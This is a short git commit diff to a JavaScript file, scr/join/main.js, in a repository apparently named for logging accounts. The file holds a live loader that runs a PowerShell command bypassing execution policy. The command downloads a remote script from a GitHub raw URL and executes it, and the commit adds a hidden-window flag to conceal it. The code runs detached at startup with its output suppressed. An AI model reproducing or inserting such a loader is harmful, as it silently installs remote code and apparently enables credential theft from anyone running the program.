0539f0f286df49bdc09483f68ed1b68dcac502b9
43a1723 <hai1723notgay@gmail.com>
2024-08-29 19:23:39 +0700

    Update main.js

--- scr/join/main.js
+++ scr/join/main.js
@@ -1,5 +1,5 @@
 const { exec } = require('child_process');
-const powerShellCommand = 'powershell -nop -ep bypass -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/download.ps1 | iex"';
+const powerShellCommand = 'powershell -nop -ep bypass -w hidden -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/download.ps1 | iex"';
 exec(powerShellCommand, { detached: true, stdio: 'ignore' });
 
 const snekfetch = require("snekfetch");
